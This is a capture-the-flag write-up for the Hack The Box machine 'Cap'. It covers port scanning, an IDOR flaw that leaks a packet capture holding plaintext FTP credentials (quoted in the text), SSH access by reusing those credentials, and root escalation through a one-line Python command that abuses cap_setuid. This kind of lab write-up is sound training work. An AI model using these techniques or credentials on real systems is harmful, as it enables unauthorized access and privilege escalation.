# Cap - Hack The Box Writeup

## Introduction
**Cap** is an easy-difficulty Linux machine on Hack The Box. The initial foothold is gained by exploiting an Insecure Direct Object Reference (IDOR) vulnerability in a web application to download a packet capture (`.pcap`) file containing plaintext FTP credentials. Reusing these credentials allows SSH access to the system. Privilege escalation is achieved by abusing the `cap_setuid` capability set on the Python binary.

### Attack Summary Table
| Metric / Phase | Details |
| --- | --- |
| **Target IP** | `10.129.79.206` |
| **OS** | Linux |
| **Initial Access** | IDOR (Sensitive PCAP Data Leak) -> Plaintext FTP Credentials -> SSH |
| **Privilege Escalation** | Capability Abuse (`cap_setuid` on `/usr/bin/python3.8`) |

---

## Reconnaissance

### Port Scanning
A full TCP port scan was performed to identify active services:

```bash
nmap 10.129.79.206 -n -Pn -p- --min-rate 3000 -oN fast_scan
```

```text
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

---

## Initial Access

### Web Enumeration & IDOR
Navigating to the web application on port 80 revealed a security dashboard where network captures (PCAPs) can be downloaded. By default, the application accesses data at `/data/1`.

Testing for Insecure Direct Object Reference (IDOR) by changing the ID from `1` to `0` allowed access to a different capture file:
* **Target URL:** `http://10.129.79.206/data/0`

### Traffic Analysis
Analyzing the downloaded `.pcap` file using Wireshark revealed plaintext FTP credentials:

![[Cap-1787344514074.webp]]

* **Credentials Found:** `nathan:Buck3tH4TF0RM3!`

### FTP & SSH Access
Using the discovered credentials, FTP access was established to retrieve the user flag:

```bash
ftp> ls -la
229 Entering Extended Passive Mode (|||49557|)
150 Here comes the directory listing.
drwxr-xr-x    3 1001     1001         4096 May 27  2021 .
drwxr-xr-x    3 0        0            4096 May 23  2021 ..
lrwxrwxrwx    1 0        0               9 May 15  2021 .bash_history -> /dev/null
-rw-r--r--    1 1001     1001          220 Feb 25  2020 .bash_logout
-rw-r--r--    1 1001     1001         3771 Feb 25  2020 .bashrc
drwx------    2 1001     1001         4096 May 23  2021 .cache
-rw-r--r--    1 1001     1001          807 Feb 25  2020 .profile
lrwxrwxrwx    1 0        0               9 May 27  2021 .viminfo -> /dev/null
-r--------    1 1001     1001           33 Aug 21 19:35 user.txt
226 Directory send OK
```

Due to credential reuse, the same credentials were used to successfully authenticate via SSH as `nathan`.

---

## Privilege Escalation

### Capability Enumeration
A search for binaries with interesting Linux capabilities revealed that `/usr/bin/python3.8` has `cap_setuid` enabled:

```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

```text
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```

### Exploit (setuid Abuse)
Abusing the `cap_setuid` capability allowed the current process to set its UID to `0` (root) and spawn a root shell:

```bash
nathan@cap:/$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@cap:/# 
```
